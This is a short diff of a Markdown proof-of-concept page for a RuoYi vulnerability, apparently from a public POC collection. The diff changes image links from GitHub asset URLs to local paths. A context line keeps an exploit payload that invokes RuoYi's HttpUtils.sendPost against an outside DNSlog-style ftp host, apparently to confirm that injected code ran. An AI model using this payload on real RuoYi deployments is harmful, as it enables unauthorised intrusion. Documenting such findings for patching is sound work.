@@ -6,9 +6,9 @@
 com.ruoyi.common.utils.http.HttpUtils.sendPost('ftp://6a928e83f9.ipv6.1433.eu.org','')
 ```
 
-![6bd379ec73798d26af505482a1863868](https://github.com/wy876/POC/assets/139549762/86812c61-c4ba-42da-9b39-564b19756bef)
+![6bd379ec73798d26af505482a1863868](../../images/86812c61-c4ba-42da-9b39-564b19756bef.png)
 
-![a2f9e3adc46a688643f3688d1464005c](https://github.com/wy876/POC/assets/139549762/ea2b8763-2303-4f6b-aa55-7b86a5a2f071)
+![a2f9e3adc46a688643f3688d1464005c](../../images/ea2b8763-2303-4f6b-aa55-7b86a5a2f071.png)
 
 ## 数据包
 ```
